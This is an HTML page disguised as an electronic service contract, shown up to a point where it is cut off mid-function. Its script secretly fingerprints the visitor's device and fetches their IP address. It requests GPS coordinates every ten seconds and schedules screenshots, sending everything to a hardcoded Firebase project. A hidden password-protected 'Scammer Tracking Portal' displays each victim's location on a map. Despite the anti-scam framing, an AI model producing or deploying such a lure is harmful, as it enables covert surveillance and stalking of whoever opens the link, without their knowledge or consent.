<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Service Agreement Contract</title>
    <style>
        /* Realistic Contract Styling */
        body {
            font-family: 'Roboto', Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            background-color: #f9f9f9;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
        }
        .contract-header {
            border-bottom: 2px solid #e1e1e1;
            padding-bottom: 15px;
            margin-bottom: 25px;
        }
        .contract-header img {
            height: 60px;
            margin-bottom: 10px;
        }
        .contract-title {
            font-size: 22px;
            font-weight: 600;
            color: #2c3e50;
        }
        .contract-subtitle {
            color: #7f8c8d;
            font-size: 16px;
        }
        .contract-body {
            background: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 15px rgba(0,0,0,0.05);
        }
        .signature-section {
            margin-top: 40px;
            padding-top: 20px;
            border-top: 1px dashed #ddd;
        }
        .loading-bar {
            height: 4px;
            background: #f0f0f0;
            border-radius: 2px;
            margin: 20px 0;
            overflow: hidden;
        }
        .loading-progress {
            height: 100%;
            width: 0%;
            background: #3498db;
            animation: loading 2s ease-in-out infinite;
        }
        @keyframes loading {
            0% { width: 0%; }
            50% { width: 80%; }
            100% { width: 0%; }
        }
        
        /* Enhanced Admin Panel */
        #adminOverlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.95);
            z-index: 9999;
            color: white;
            padding: 20px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
        }
        .admin-panel {
            background: #121212;
            border-radius: 10px;
            padding: 20px;
            max-width: 1000px;
            margin: 20px auto;
            box-shadow: 0 0 20px rgba(0,255,0,0.1);
        }
        .session-card {
            background: #1e1e1e;
            padding: 15px;
            margin-bottom: 15px;
            border-radius: 8px;
            border-left: 4px solid #27ae60;
        }
        .gps-link {
            color: #3498db;
            text-decoration: underline;
            cursor: pointer;
        }
        .data-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }
        #loginForm {
            text-align: center;
            margin: 50px auto;
            max-width: 400px;
        }
        #loginForm input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border-radius: 4px;
            border: 1px solid #444;
            background: #222;
            color: white;
        }
        #loginForm button {
            background: #27ae60;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 4px;
            cursor: pointer;
            font-weight: bold;
            width: 100%;
        }
        .action-buttons {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        .action-buttons button {
            flex: 1;
            padding: 8px;
            border-radius: 4px;
            cursor: pointer;
        }
        .accuracy-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 5px;
        }
        .high-accuracy {
            background: #2ecc71;
        }
        .medium-accuracy {
            background: #f39c12;
        }
        .low-accuracy {
            background: #e74c3c;
        }
    </style>
</head>
<body>
    <!-- Realistic Contract Page -->
    <div class="contract-header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ac/Legal_Document_Icon.svg/1200px-Legal_Document_Icon.svg.png" alt="Legal Document">
        <div class="contract-title">SERVICE PROVIDER AGREEMENT</div>
        <div class="contract-subtitle">Effective Date: <span id="currentDate"></span> | Contract ID: <span id="contractId"></span></div>
    </div>
    
    <div class="contract-body">
        <div class="loading-bar">
            <div class="loading-progress"></div>
        </div>
        <p style="text-align: center; color: #7f8c8d;"><i>Preparing document for electronic signature...</i></p>
        
        <div id="contractContent" style="display: none;">
            <h3>1. PARTIES</h3>
            <p>This Agreement is made between <strong>Service Provider Inc.</strong> ("Provider") and the undersigned client ("Client").</p>
            
            <h3>2. SERVICES</h3>
            <p>The Provider agrees to deliver the services described in Exhibit A, attached hereto and incorporated herein by reference.</p>
            
            <h3>3. COMPENSATION</h3>
            <p>Client shall pay Provider the sum of $<input type="text" id="paymentAmount" style="width: 80px; border: 1px solid #ddd; padding: 5px;"> upon execution of this Agreement.</p>
            
            <div class="signature-section">
                <h3>ELECTRONIC SIGNATURE</h3>
                <p>By entering your name below, you agree to the terms of this Agreement:</p>
                <input type="text" id="signatureName" placeholder="Full Legal Name" style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px;">
                <button id="signButton" style="background: #27ae60; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; font-size: 16px;">Sign Agreement</button>
            </div>
        </div>
    </div>

    <!-- Hidden Admin Portal -->
    <div id="adminOverlay">
        <div id="loginForm">
            <h2>üîí Law Enforcement Access</h2>
            <input type="password" id="adminPassword" placeholder="Enter Access Code">
            <button onclick="verifyAdmin()">Authenticate</button>
        </div>
        
        <div class="admin-panel" id="adminPanel" style="display: none;">
            <h2 style="color: #27ae60;">üõ°Ô∏è <span style="color: white;">SCAMMER TRACKING PORTAL</span></h2>
            <p style="color: #bbb;">
                <span id="sessionCount">0</span> active sessions | 
                Last update: <span id="lastUpdate">--:--:--</span>
            </p>
            
            <div class="data-grid" id="sessionList"></div>
            
            <div style="margin-top: 30px; text-align: center;">
                <button onclick="exportAllData()" style="background: #27ae60; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; margin: 5px; font-weight: bold;">
                    üì• Export All Data (JSON)
                </button>
                <button onclick="deleteAllData()" style="background: #e74c3c; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; margin: 5px;">
                    üóëÔ∏è Delete All Data
                </button>
                <button onclick="hideAdmin()" style="background: #e67e22; color: white; border: none; padding: 12px 25px; border-radius: 4px; cursor: pointer; margin: 5px;">
                    ‚ùå Close Panel
                </button>
            </div>
        </div>
    </div>

    <!-- Firebase & Tracking Scripts -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
    <script>
        // ========================
        // üî• YOUR FIREBASE CONFIG
        // ========================
        const firebaseConfig = {
            apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
            authDomain: "gps-d0bab.firebaseapp.com",
            databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
            projectId: "gps-d0bab",
            storageBucket: "gps-d0bab.appspot.com",
            messagingSenderId: "810816177909",
            appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        const storage = firebase.storage();

        // ========================
        // üé≠ REALISTIC CONTRACT BEHAVIOR
        // ========================
        document.getElementById('currentDate').textContent = new Date().toLocaleDateString('en-US', { 
            year: 'numeric', month: 'long', day: 'numeric' 
        });
        document.getElementById('contractId').textContent = 'CN-' + 
            Math.floor(Math.random() * 9000 + 1000) + '-' + 
            Math.floor(Math.random() * 9000 + 1000);

        // Simulate document loading
        setTimeout(() => {
            document.querySelector('.loading-bar').style.display = 'none';
            document.getElementById('contractContent').style.display = 'block';
        }, 3500);

        // ========================
        // üïµÔ∏è‚Äç‚ôÇÔ∏è ENHANCED LOCATION TRACKING
        // ========================
        const sessionId = 'session_' + Math.random().toString(36).substring(2, 15);
        const adminPassword = "ScamTracker2024"; // CHANGE THIS IN PRODUCTION

        // 1. FAST GPS Acquisition System
        function acquireFastLocation() {
            return new Promise((resolve) => {
                // First try: High accuracy with short timeout
                const highAccuracyOptions = {
                    enableHighAccuracy: true,
                    maximumAge: 0,  // Force fresh reading
                    timeout: 5000  // 5 second timeout
                };

                const attemptLocation = (options) => {
                    navigator.geolocation.getCurrentPosition(
                        position => {
                            const { latitude, longitude, accuracy } = position.coords;
                            const accuracyClass = accuracy < 50 ? 'high-accuracy' : 
                                               accuracy < 200 ? 'medium-accuracy' : 'low-accuracy';
                            resolve({
                                coords: { lat: latitude, lng: longitude },
                                accuracy: accuracy,
                                accuracyClass: accuracyClass,
                                mapsLink: `https://maps.google.com/?q=${latitude},${longitude}`,
                                status: "active",
                                method: "high-accuracy"
                            });
                        },
                        error => {
                            resolve({
                                status: "error",
                                error: error.message || "Location unavailable"
                            });
                        },
                        options
                    );
                };

                if (navigator.geolocation) {
                    attemptLocation(highAccuracyOptions);
                } else {
                    resolve({
                        status: "unsupported",
                        error: "Geolocation not available"
                    });
                }
            });
        }

        // 2. Track Location with Fallbacks
        async function trackLocation() {
            // Immediately set status to show we're trying
            db.ref(`sessions/${sessionId}/location`).set({
                status: "acquiring",
                timestamp: new Date().toISOString()
            });

            const location = await acquireFastLocation();
            
            // Save results to Firebase
            db.ref(`sessions/${sessionId}/location`).update({
                ...location,
                timestamp: new Date().toISOString(),
                lastUpdated: new Date().toLocaleTimeString()
            });

            return location.status === "active";
        }

        // 3. Enhanced Device Fingerprinting
        function collectDeviceData() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                languages: navigator.languages,
                cpuCores: navigator.hardwareConcurrency || 'unknown',
                memory: navigator.deviceMemory || 'unknown',
                ip: 'pending'
            };
        }

        // ========================
        // üöÄ INITIALIZE TRACKING
        // ========================
        db.ref(`sessions/${sessionId}`).update({
            startTime: new Date().toISOString(),
            device: collectDeviceData()
        });

        // Get IP address
        fetch('https://api.ipify.org?format=json')
            .then(res => res.json())
            .then(data => {
                db.ref(`sessions/${sessionId}/device`).update({
                    ip: data.ip
                });
            });

        // Start tracking systems
        setupFormTracking();
        
        // FAST INITIAL LOCATION (no delay)
        trackLocation().then(success => {
            if (success) {
                console.log("Fast location acquired!");
            }
        });
        
        // Ongoing tracking
        setInterval(trackLocation, 10000); // Update every 10 seconds
        setTimeout(captureScreenshot, 5000);
        setInterval(captureScreenshot, 30000);

        // ========================
        // üõ†Ô∏è ADMIN PANEL FUNCTIONS
        // ========================
        function verifyAdmin() {
            const enteredPassword = document.getElementById('adminPassword').value;
            if (enteredPassword === adminPassword) {
                document.getElementById('loginForm').style.display = 'none';
                document.getElementById('adminPanel').style.display = 'block';
                loadActiveSessions();
            } else {
                alert("‚ö†Ô∏è Invalid access code");
            }
        }

        function hideAdmin() {
            document.getElementById('adminOverlay').style.display = 'none';
            document.getElementById('loginForm').style.display = 'block';
            document.getElementById('adminPanel').style.display = 'none';
        }

        function loadActiveSessions() {
            db.ref('sessions').on('value', (snapshot) => {
                const sessions = snapshot.val() || {};
                document.getElementById('sessionCount').textContent = Object.keys(sessions).length;
                document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString();
                
                let sessionsHTML = '';
                Object.entries(sessions).forEach(([sessionId, sessionData]) => {
                    const device = sessionData.device || {};
                    const location = sessionData.location || {};
                    const ip = device.ip || 'Unknown';
                    
                    let locationStatus = "‚ùå Blocked";
                    let mapsLink = "#";
                    let accuracyIndicator = "";
                    
                    if (location && location.status === "active") {
                        locationStatus = `‚úÖ ${location.coords.lat}, ${location.coords.lng}`;
                        mapsLink = location.mapsLink;
                        accuracyIndicator = `<span class="accuracy-indicator ${location.accuracyClass || 'medium-accuracy'}"></span>`;
                    } else if (location && location.error) {
                        locationStatus = `‚ö†Ô∏è ${location.error}`;
                    }
                    
                    sessionsHTML += `
                        <div class="session-card">
                            <h3>üîé ${sessionId}</h3>
                            <p><strong>üìÖ Started:</strong> ${new Date(sessionData.startTime).toLocaleString()}</p>
                            <p><strong>üåê IP:</strong> ${ip}</p>
                            <p><strong>üìç Location:</strong> ${accuracyIndicator}${locationStatus}</p>
                            
                            ${mapsLink !== "#" ? `
                                <p>
                                    <a class="gps-link" onclick="window.open('${mapsLink}', '_blank')">
                                        üó∫Ô∏è View in Google Maps
                                    </a>
                                </p>
                            ` : ''}
                            
                            <div class="action-buttons">
                                <button onclick="deleteSession('${sessionId}')" style="background: #e74c3c; color: white; border: none;">
                                    üóëÔ∏è Delete
                                </button>
                                <button onclick="viewFullSession('${sessionId}')" style="background: #3498db; color: white; border: none;">
                                    üîç Details
                                </button>
                            </div>
                        </div>
                    `;
                });
                document.getElementById('sessionList').innerHTML = sessionsHTML;
            });
        }

        function deleteSession(sessionId) {
            if (confirm(`Delete ALL data for session ${sessionId}?`)) {
                db.ref(`sessions/${sessionId}`).remove()
                    .then(() => alert("Session deleted successfully"))
                    .catch(() => alert("Failed to delete session"));
            }
        }

        function deleteAllData() {
            if (confirm("‚ö†Ô∏è Delete ALL tracking data? This cannot be undone!")) {
                db.ref('sessions').remove()
                    .then(() => {
                        alert("All data deleted successfully");
                        document.getElementById('sessionList').innerHTML = '';
                        document.getElementById('sessionCount').textContent = '0';
                    })
                    .catch(() => alert("Failed to delete data"));
            }
        }

        function viewFullSession(sessionId) {
            db.ref(`sessions/${sessionId}`).once('value').then(snapshot => {
                const data = snapshot.val();
                const win = window.open("", "Session Details", "width=800,height=600");
                win.document.write(`
                    <html>
                        <head><title>Session: ${sessionId}</title></head>
                        <body style="font-family: Arial; padding: 20px; background: #f5f5f5;">
                            <h1>üîç Session Forensics: ${sessionId}</h1>
                            <pre style="background: white; padding: 20px; border-radius: 5px; overflow-x: auto;">
${JSON.stringify(data, null, 2)}
                            </pre>
                            <button onclick="window.close()" style="padding: 10px 20px; background: #e74c3c; color: white; border: none; border-radius: 5px; cursor: pointer;">
                                Close
                    
